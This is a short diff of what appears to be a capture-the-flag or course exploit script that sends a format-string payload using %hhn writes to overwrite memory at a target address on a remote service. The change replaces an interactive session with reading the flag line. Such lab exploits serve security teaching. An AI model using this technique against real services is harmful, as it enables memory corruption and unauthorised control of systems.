@@ -11,7 +11,5 @@ buffer = p32(target_address + 1) + p32(target_address) + \
          b"%138x" + b"%7$hhn" + b"%132x" + b"%8$hhn"
 
 remote.sendline(buffer)
-remote.interactive()
-#print(remote.recvall())
-#flag = remote.recvline_contains(b"SSof")
-#print(flag.decode())
+flag = remote.recvline_contains(b"SSof")
+print(flag.decode())
